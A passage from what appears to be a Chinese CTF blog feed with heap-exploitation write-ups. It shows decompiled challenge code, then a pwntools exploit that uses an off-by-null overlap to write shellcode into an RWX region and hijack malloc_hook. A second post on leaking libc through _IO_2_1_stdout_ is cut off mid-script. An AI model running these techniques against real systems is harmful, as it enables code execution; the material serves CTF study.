class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_CD0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(chunk_addr, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">5uLL</span>);</span><br><span class="line">  buf &amp;= <span class="number">0xFFFFFFF000</span>uLL;</span><br><span class="line">  close(fd);</span><br><span class="line">  v3 = mmap((<span class="keyword">void</span> *)buf, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Mmap: %p\n&quot;</span>, v3);</span><br><span class="line">  count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_CBD();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_F89</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No more space.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;Memory allocate failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = v2;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i] = size;</span><br><span class="line">  ++count[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk at [%d] Pointer Address %p\n&quot;</span>, i, &amp;chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10C2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> &amp;&amp; *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>));</span><br><span class="line">    *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2) = <span class="number">0LL</span>;</span><br><span class="line">    v0 = count;</span><br><span class="line">    --count[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="edit-1"><a href="#edit-1" class="headerlink" title="edit"></a>edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>], chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中的 my_read 函数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E2D</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;Read failed!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> ) <span class="comment">//遇到回车不读入</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == a2 )      <span class="comment">//off by null</span></span><br><span class="line">    *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="没有-show-函数"><a href="#没有-show-函数" class="headerlink" title="没有 show 函数"></a>没有 show 函数</h4><h3 id="思路和exp"><a href="#思路和exp" class="headerlink" title="思路和exp"></a>思路和exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29502)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line">rwx = <span class="number">0x32b3060000</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">mmap = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;mmap: &quot;</span> + <span class="built_in">hex</span>(mmap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1 .</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#unsortedbin</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2  2alloc == 1alloc</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了之后能add到mmap</span></span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#uaf  此时构成了一个循环 1-&gt;2-&gt;1</span></span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#uaf</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2 2alloc == 1alloc</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3 mmap</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">edit(<span class="number">3</span>,shellcode+<span class="string">&#x27;\n&#x27;</span>)<span class="comment"># shellcode写入mmap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再触发一次 unsortedbin double free 劫持 malloc_hook</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1free==2allc</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0 切割unsortedbin 使 malloc_hook 链入</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x30\n&#x27;</span>)<span class="comment">#edit to malloc hook</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 malloc_hook</span></span><br><span class="line">edit(<span class="number">4</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE利用之_IO_2_1_stdout泄露libc</title>
      <link href="/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/"/>
      <url>/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/</url>
      
        <content type="html"><![CDATA[<p> 当俺们进行文件操作时，Linux内核会创建一些结构体来描述这些文件，当我们对结构体操作时就相当于对文件操作。</p><h2 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h2><p>FILE 在 linux 系统的标准IO库使用来描述文件结构，称之为文件流。</p><p>“流”是一种抽象概念，只是人们为了便于描述数据的流向而创造的名称。</p><p>比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流”。</p><p>进程中的FILE结构会通过 <code>_chain</code>域彼此连接形成一个链表，链表头部用全局变量<code>_IO_list_all</code>表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379023678569/e99e2835af561bb871032af6afda6efda4432203.png" alt="1"></p><p>每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。</p><p>因为会自动打开，所以在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code>。</p><p>具体原理可以参考下方博客</p><hr><p><strong>简言之</strong></p><p>想办法写入 IO_2_1_stdout（一般是利用 unsortedbin ）,让_flags = 0xFBAD1800，然后让后面的三个read参数为0,让write_base为’\x00’</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379033640211/a6bd4ce51324e89fd2e180640ffc6adad598217b.png" alt="2"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636601759750578/1109fea1501c4407903c3f2e7343a846818219ce.png" alt="image-20211111113559572"></p><p>保护全开，不能改函数 got 表</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602084888576/4f90e91b8b2b761056fe004e1a1dd68d7c58a0e5.png" alt="image-20211111114124706"></p><p>逻辑是输入申请大小，再输入 index ，然后就写入 chunk，但是大小不能超过 0x60</p><p>没有任何检查，比如申请过的 index 不能用之类的</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602307580095/1464045816e239d160bd9368ba9f18cac520924d.png" alt="image-20211111114507443"></p><p>uaf 漏洞</p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602391221854/31a810436390a4653f738fa9bef12833ee8b9905.png" alt="image-20211111114631037"></p><p>没有检查该 idx 是否已被 free</p><p>不能用 unsorted bin 来泄露地址了，于是想到用 __IO_2_1_stdout 来泄露信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;25197&quot;)</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x45261</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:\n&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createX</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteX</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renameX</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baopo</span>():</span></span><br><span class="line">create(<span class="number">32</span>,<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="number">16</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">3</span>,p64(<span class="number">0x70</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">2</span>,<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">16</span>,<span class="number">4</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">16</span>) <span class="comment">#2 out of bins</span></span><br><span class="line">create(<span class="number">16</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">48</span>,<span class="number">6</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#6和7是凑数的，为了释放0x100的时候，下一个堆块得写入presize</span></span><br><span class="line">create(<span class="number">48</span>,<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#防止fake chunk与top合并</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">delete(<span 